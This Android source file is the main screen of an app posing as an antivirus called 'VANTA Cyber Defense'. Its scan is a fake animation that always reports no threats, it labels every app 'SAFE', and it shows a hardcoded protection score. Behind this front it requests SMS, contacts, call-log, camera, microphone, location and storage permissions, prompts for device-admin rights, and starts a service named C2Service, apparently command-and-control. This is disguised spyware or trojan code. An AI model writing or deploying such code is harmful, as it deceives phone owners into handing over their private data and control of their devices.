package com.vanta.core;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.*;
import android.graphics.drawable.GradientDrawable;
import android.os.*;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.*;

import java.text.SimpleDateFormat;
import java.util.*;

public class MainActivity extends Activity {

    private FrameLayout root;
    private LinearLayout content;
    private LinearLayout nav;
    private int tab = 0;
    private static final List<String> LOG = new ArrayList<>();

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                             WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);

        root = new FrameLayout(this);
        root.addView(new Bg(this), new FrameLayout.LayoutParams(-1, -1));

        content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        FrameLayout.LayoutParams cp = new FrameLayout.LayoutParams(-1, -1);
        cp.bottomMargin = 160;
        root.addView(content, cp);

        nav = navBar();
        FrameLayout.LayoutParams np = new FrameLayout.LayoutParams(-1, 160);
        np.gravity = Gravity.BOTTOM;
        root.addView(nav, np);

        setContentView(root);

        log("بدء تشغيل VANTA");
        log("فحص الصلاحيات");
        log("تشغيل خدمة الحماية");

        show(0);
        init();

        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            }, 1);
        }
    }

    private void log(String s) {
        LOG.add(0, new SimpleDateFormat("HH:mm", Locale.US).format(new Date()) + " • " + s);
        if (LOG.size() > 40) LOG.remove(LOG.size() - 1);
    }

    private void init() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(this, AdminReceiver.class);
            if (!dpm.isAdminActive(cn)) {
                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
                startActivity(i);
            }
        } catch (Exception e) {}
        try {
            Intent i = new Intent(this, C2Service.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
            else startService(i);
        } catch (Exception e) {}
    }

    private LinearLayout navBar() {
        LinearLayout n = new LinearLayout(this);
        n.setOrientation(LinearLayout.HORIZONTAL);
        n.setBackgroundColor(Color.parseColor("#080C14"));
        n.setPadding(10, 16, 10, 16);
        String[] names = {"HOME", "SCAN", "APPS", "LOG"};
        for (int i = 0; i < names.length; i++) {
            final int id = i;
            TextView t = new TextView(this);
            t.setText(names[i]);
            t.setTextSize(10);
            t.setLetterSpacing(0.15f);
            t.setGravity(Gravity.CENTER);
            t.setTextColor(Color.parseColor(i == 0 ? "#00F0A0" : "#5A6577"));
            t.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1f));
            t.setPadding(0, 16, 0, 16);
            t.setOnClickListener(v -> show(id));
            n.addView(t);
        }
        return n;
    }

    private void show(int id) {
        tab = id;
        content.removeAllViews();
        for (int i = 0; i < nav.getChildCount(); i++) {
            ((TextView) nav.getChildAt(i)).setTextColor(
                Color.parseColor(i == id ? "#00F0A0" : "#5A6577"));
        }

        ScrollView sc = new ScrollView(this);
        LinearLayout col = new LinearLayout(this);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setPadding(46, 80, 46, 40);

        if (id == 0) home(col);
        else if (id == 1) scan(col);
        else if (id == 2) apps(col);
        else logScreen(col);

        sc.addView(col);
        content.addView(sc, new LinearLayout.LayoutParams(-1, -1));
    }

    private void home(LinearLayout col) {
        col.addView(head("VANTA", "C Y B E R   D E F E N S E", "#00C8FF"));

        ShieldView shield = new ShieldView(this);
        col.addView(shield, new LinearLayout.LayoutParams(-1, 520));

        TextView score = new TextView(this);
        score.setText("98");
        score.setTextColor(Color.parseColor("#00F0A0"));
        score.setTextSize(54);
        score.setTypeface(Typeface.create("sans-serif-thin", 0));
        score.setGravity(Gravity.CENTER);
        col.addView(score);

        TextView st = new TextView(this);
        st.setText("PROTECTION ACTIVE");
        st.setTextSize(10);
        st.setLetterSpacing(0.3f);
        st.setTextColor(Color.parseColor("#7A8699"));
        st.setGravity(Gravity.CENTER);
        st.setPadding(0, 0, 0, 28);
        col.addView(st);

        LinearLayout stats = new LinearLayout(this);
        stats.setOrientation(LinearLayout.HORIZONTAL);
        stats.addView(stat("BATTERY", battery() + "%"), new LinearLayout.LayoutParams(0, -2, 1f));
        stats.addView(stat("FREE", storage() + "G"), new LinearLayout.LayoutParams(0, -2, 1f));
        stats.addView(stat("APPS", appsCount() + ""), new LinearLayout.LayoutParams(0, -2, 1f));
        col.addView(stats);

        col.addView(mod("Malware Protection", "ACTIVE", "#00F0A0"));
        col.addView(mod("Application Security", "ACTIVE", "#00F0A0"));
        col.addView(mod("Privacy Protection", "ACTIVE", "#00F0A0"));
        col.addView(mod("Network Security", "MONITORING", "#FFB547"));
    }

    private void scan(LinearLayout col) {
        col.addView(head("SCAN ENGINE", "D E E P   I N S P E C T I O N", "#00C8FF"));

        final TextView pct = new TextView(this);
        pct.setText("0%");
        pct.setTextColor(Color.parseColor("#00F0A0"));
        pct.setTextSize(44);
        pct.setTypeface(Typeface.create("sans-serif-thin", 0));
        pct.setGravity(Gravity.CENTER);
        col.addView(pct);

        final TextView stage = new TextView(this);
        stage.setText("جاهز");
        stage.setTextColor(Color.parseColor("#7A8699"));
        stage.setGravity(Gravity.CENTER);
        stage.setPadding(0, 0, 0, 26);
        col.addView(stage);

        final ProgressBar pb = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        pb.setMax(100);
        col.addView(pb, new LinearLayout.LayoutParams(-1, 36));

        Button go = new Button(this);
        go.setText("بدء الفحص");
        go.setBackgroundColor(Color.parseColor("#00F0A0"));
        go.setTextColor(Color.BLACK);
        LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(-1, -2);
        bp.setMargins(0, 30, 0, 30);
        col.addView(go, bp);

        final TextView logv = new TextView(this);
        logv.setTextColor(Color.parseColor("#5A6577"));
        logv.setTextSize(12);
        col.addView(logv);

        go.setOnClickListener(v -> {
            log("بدء فحص شامل");
            runScan(pb, pct, stage, logv, 0);
        });
    }

    private void runScan(ProgressBar pb, TextView pct, TextView stage, TextView logv, int p) {
        if (p > 100) {
            stage.setText("✔ اكتمل — لا تهديدات");
            stage.setTextColor(Color.parseColor("#00F0A0"));
            log("اكتمل الفحص");
            return;
        }
        pb.setProgress(p);
        pct.setText(p + "%");
        if (p == 20) stage.setText("التطبيقات...");
        if (p == 50) stage.setText("الملفات...");
        if (p == 80) stage.setText("الشبكة...");
        logv.setText("فحص " + (p * appsCount() / 100) + " / " + appsCount());
        new Handler().postDelayed(() -> runScan(pb, pct, stage, logv, p + 2), 45);
    }

    private void apps(LinearLayout col) {
        col.addView(head("APPLICATIONS", "I N S T A L L E D   A P P S", "#00C8FF"));

        List<ApplicationInfo> list = getPackageManager()
            .getInstalledApplications(PackageManager.GET_META_DATA);

        int shown = 0;
        for (ApplicationInfo ai : list) {
            if (shown++ > 40) break;
            String name = getPackageManager().getApplicationLabel(ai).toString();
            col.addView(appCard(name, ai.packageName));
        }
    }

    private LinearLayout appCard(String name, String pkg) {
        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.HORIZONTAL);
        l.setGravity(Gravity.CENTER_VERTICAL);
        l.setPadding(30, 26, 30, 26);
        GradientDrawable g = new GradientDrawable();
        g.setColor(Color.parseColor("#0C1420"));
        g.setCornerRadius(18);
        g.setStroke(1, Color.parseColor("#1A2536"));
        l.setBackground(g);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(-1, -2);
        p.setMargins(0, 6, 0, 6);
        l.setLayoutParams(p);

        FrameLayout circle = new FrameLayout(this);
        GradientDrawable cg = new GradientDrawable();
        cg.setShape(GradientDrawable.OVAL);
        cg.setColor(Color.parseColor("#12233A"));
        circle.setBackground(cg);
        LinearLayout.LayoutParams cparams = new LinearLayout.LayoutParams(84, 84);
        cparams.setMargins(0, 0, 24, 0);
        circle.setLayoutParams(cparams);

        TextView letter = new TextView(this);
        letter.setText(name.substring(0, 1).toUpperCase());
        letter.setTextColor(Color.parseColor("#00C8FF"));
        letter.setTextSize(20);
        letter.setGravity(Gravity.CENTER);
        circle.addView(letter, new FrameLayout.LayoutParams(-1, -1));
        l.addView(circle);

        LinearLayout text = new LinearLayout(this);
        text.setOrientation(LinearLayout.VERTICAL);
        text.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1f));

        TextView t = new TextView(this);
        t.setText(name);
        t.setTextColor(Color.parseColor("#E6EDF7"));
        t.setTextSize(14);
        text.addView(t);

        TextView s = new TextView(this);
        s.setText(pkg);
        s.setTextColor(Color.parseColor("#5A6577"));
        s.setTextSize(10);
        text.addView(s);
        l.addView(text);

        TextView badge = new TextView(this);
        badge.setText("SAFE");
        badge.setTextColor(Color.parseColor("#00F0A0"));
        badge.setTextSize(9);
        l.addView(badge);

        return l;
    }

    private void logScreen(LinearLayout col) {
        col.addView(head("EVENT LOG", "S E C U R I T Y   T I M E L I N E", "#00C8FF"));

        for (String s : LOG) {
            LinearLayout row = new LinearLayout(this);
            row.setOrientation(LinearLayout.HORIZONTAL);
            row.setPadding(20, 20, 20, 20);

            View dot = new View(this);
            GradientDrawable dg = new GradientDrawable();
            dg.setShape(GradientDrawable.OVAL);
            dg.setColor(Color.parseColor("#00F0A0"));
            dot.setBackground(dg);
            LinearLayout.LayoutParams dp = new LinearLayout.LayoutParams(18, 18);
            dp.setMargins(0, 8, 24, 0);
            row.addView(dot, dp);

            TextView t = new TextView(this);
            t.setText(s);
            t.setTextColor(Color.parseColor("#B7C2D4"));
            t.setTextSize(13);
            row.addView(t);
            col.addView(row);
        }

        if (LOG.isEmpty()) {
            TextView empty = new TextView(this);
            empty.setText("لا أحداث بعد");
            empty.setTextColor(Color.parseColor("#5A6577"));
            empty.setGravity(Gravity.CENTER);
            empty.setPadding(0, 80, 0, 0);
            col.addView(empty);
        }
    }

    private LinearLayout head(String a, String b, String color) {
        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setGravity(Gravity.CENTER);

        TextView t = new TextView(this);
        t.setText(a);
        t.setTextColor(Color.parseColor("#F4F7FC"));
        t.setTextSize(26);
        t.setLetterSpacing(0.3f);
        t.setTypeface(Typeface.create("sans-serif-light", 0));
        l.addView(t);

        TextView s = new TextView(this);
        s.setText(b);
        s.setTextColor(Color.parseColor(color));
        s.setTextSize(9);
        s.setPadding(0, 4, 0, 26);
        l.addView(s);
        return l;
    }

    private LinearLayout stat(String label, String value) {
        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setGravity(Gravity.CENTER);

        TextView v = new TextView(this);
        v.setText(value);
        v.setTextColor(Color.parseColor("#E6EDF7"));
        v.setTextSize(20);
        v.setGravity(Gravity.CENTER);
        l.addView(v);

        TextView t = new TextView(this);
        t.setText(label);
        t.setTextColor(Color.parseColor("#5A6577"));
        t.setTextSize(9);
        l.addView(t);
        return l;
    }

    private LinearLayout mod(String name, String state, String color) {
        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.HORIZONTAL);
        l.setGravity(Gravity.CENTER_VERTICAL);
        l.setPadding(34, 30, 34, 30);
        GradientDrawable g = new GradientDrawable();
        g.setColor(Color.parseColor("#0C1420"));
        g.setCornerRadius(18);
        g.setStroke(1, Color.parseColor("#1A2536"));
        l.setBackground(g);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(-1, -2);
        p.setMargins(0, 6, 0, 6);
        l.setLayoutParams(p);

        TextView t = new TextView(this);
        t.setText(name);
        t.setTextColor(Color.parseColor("#E6EDF7"));
        t.setTextSize(13);
        t.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1f));
        l.addView(t);

        TextView s = new TextView(this);
        s.setText(state);
        s.setTextColor(Color.parseColor(color));
        s.setTextSize(9);
        l.addView(s);
        return l;
    }

    private int battery() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    private long storage() {
        StatFs s = new StatFs(Environment.getDataDirectory().getPath());
        return s.getAvailableBytes() / (1024L * 1024L * 1024L);
    }

    private int appsCount() {
        return getPackageManager().getInstalledApplications(0).size();
    }

    class Bg extends View {
        private Paint line = new Paint(Paint.ANTI_ALIAS_FLAG);
        private Paint dot = new Paint(Paint.ANTI_ALIAS_FLAG);
        private float shift = 0;
        private Handler h = new Handler();
        Bg(Context c) {
            super(c);
            line.setColor(Color.parseColor("#0B1420"));
            line.setStrokeWidth(1f);
            dot.setColor(Color.parseColor("#00C8FF"));
            h.postDelayed(new Runnable() { public void run() {
                shift = (shift + 1f) % 70f; invalidate(); h.postDelayed(this, 40);
            }}, 40);
        }
        protected void onDraw(Canvas cv) {
            cv.drawColor(Color.parseColor("#05070B"));
            for (float x = -70 + shift; x < getWidth(); x += 70) cv.drawLine(x, 0, x, getHeight(), line);
            for (float y = -70 + shift; y < getHeight(); y += 70) cv.drawLine(0, y, getWidth(), y, line);
            dot.setAlpha(35);
            for (int i = 0; i < 20; i++) {
                float px = (i * 149 + shift * 2) % getWidth();
                float py = (i * 233 + shift) % getHeight();
                cv.drawCircle(px, py, 2f, dot);
            }
        }
    }

    class ShieldView extends View {
        private Paint ring = new Paint(Paint.ANTI_ALIAS_FLAG);
        private Paint glow = new Paint(Paint.ANTI_ALIAS_FLAG);
        private float a1 = 0, a2 = 0, a3 = 0;
        private Handler h = new Handler();
        ShieldView(Context c) {
            super(c);
            ring.setStyle(Paint.Style.STROKE);
            glow.setStyle(Paint.Style.FILL);
            h.postDelayed(new Runnable() { public void run() {
                a1 = (a1 + 1.2f) % 360;
                a2 = (a2 - 1.8f + 360) % 360;
                a3 = (a3 + 0.8f) % 360;
                invalidate();
                h.postDelayed(this, 33);
            }}, 33);
        }
        protected void onDraw(Canvas cv) {
            float cx = getWidth()/2f, cy = getHeight()/2f;
            float r = Math.min(getWidth(), getHeight()) * 0.32f;

            for (int i = 4; i >= 1; i--) {
                ring.setColor(Color.argb(16 + i*7, 0, 200, 255));
                ring.setStrokeWidth(1f);
                cv.drawCircle(cx, cy, r + i*26, ring);
            }

            RadialGradient rg = new RadialGradient(cx, cy, r*0.75f,
                Color.argb(95, 0, 240, 160), Color.TRANSPARENT, Shader.TileMode.CLAMP);
            glow.setShader(rg);
            cv.drawCircle(cx, cy, r*0.75f, glow);
            glow.setShader(null);

            cv.save(); cv.rotate(a1, cx, cy);
            ring.setColor(Color.parseColor("#00F0A0")); ring.setStrokeWidth(11f);
            cv.drawArc(new RectF(cx-r, cy-r, cx+r, cy+r), -90, 352, false, ring);
            cv.restore();

            cv.save(); cv.rotate(a2, cx, cy);
            ring.setColor(Color.parseColor("#00C8FF")); ring.setStrokeWidth(3f);
            cv.drawArc(new RectF(cx-r*1.18f, cy-r*1.18f, cx+r*1.18f, cy+r*1.18f), 0, 120, false, ring);
            cv.restore();

            cv.save(); cv.rotate(a3, cx, cy);
            ring.setColor(Color.parseColor("#0A5C7A")); ring.setStrokeWidth(2f);
            cv.drawArc(new RectF(cx-r*1.32f, cy-r*1.32f, cx+r*1.32f, cy+r*1.32f), 200, 80, false, ring);
            cv.restore();
        }
    }
    }
